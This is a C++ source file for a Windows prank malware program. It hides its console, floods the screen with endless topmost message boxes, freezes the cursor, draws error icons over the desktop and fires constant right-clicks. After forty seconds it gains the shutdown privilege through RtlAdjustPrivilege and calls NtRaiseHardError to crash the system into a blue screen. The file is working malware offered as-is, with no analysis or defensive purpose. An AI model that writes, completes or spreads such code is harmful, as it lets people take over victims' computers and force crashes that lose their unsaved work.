#include <thread>
#include <iostream>
#include <windows.h>
#include <synchapi.h>
#pragma comment(lib, "ntdll.lib")

void Sleep(
	DWORD dwMilliseconds
);

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
	ULONG    Privilege,
	BOOLEAN  Enable,
	BOOLEAN  CurrentThread,
	PBOOLEAN Enabled
);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus,
	ULONG NumberOfParameters,
	PULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters,
	ULONG ValidResponseOption,
	PULONG Response
);

void WarpCursor() {
	POINT cursor;
	while (true) {
		GetCursorPos(&cursor);
		Sleep(500);
		SetCursorPos(cursor.x, cursor.y);
	}
}

void DrawIconsCursor()
{
	POINT cursor;
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	while (true)
	{
		int random = rand() % 3;
		GetCursorPos(&cursor);
		Sleep(50);
		if (random == 1) {
			DrawIcon(hdc, (cursor.x) + 200, (cursor.y) + 80, LoadIcon(NULL, IDI_ERROR));
		}
		else if (random == 2) {
			Sleep(3);
			DrawIcon(hdc, (cursor.x) + 250, (cursor.y) + 40, LoadIcon(NULL, IDI_WARNING));
		}
		else {
			Sleep(3);
			DrawIcon(hdc, (cursor.x) + 150, (cursor.y) + 10, LoadIcon(NULL, IDI_QUESTION));
		}
	}
}

void payload() {
	while (true) {
		MessageBoxA(0, "You'e Been Gnomed", "You've Been Gnomed", MB_TOPMOST | MB_ABORTRETRYIGNORE);
		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);
		MessageBeep(MB_ICONINFORMATION);
	}
}
void RightClick()
{
	while (true) {
		mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
	}

}

int main() {
	BOOLEAN bl;
	POINT cursor;
	unsigned long response;

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::thread t1(payload);
	std::thread t2(WarpCursor);
	std::thread t3(DrawIconsCursor);
	std::thread t4(RightClick);
	Sleep(40'000);
	RtlAdjustPrivilege(19, true, false, &bl);
	MessageBeep(MB_ICONINFORMATION);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	t1.join();
	t2.join();
	t3.join();
	t4.join();
	return 0;
}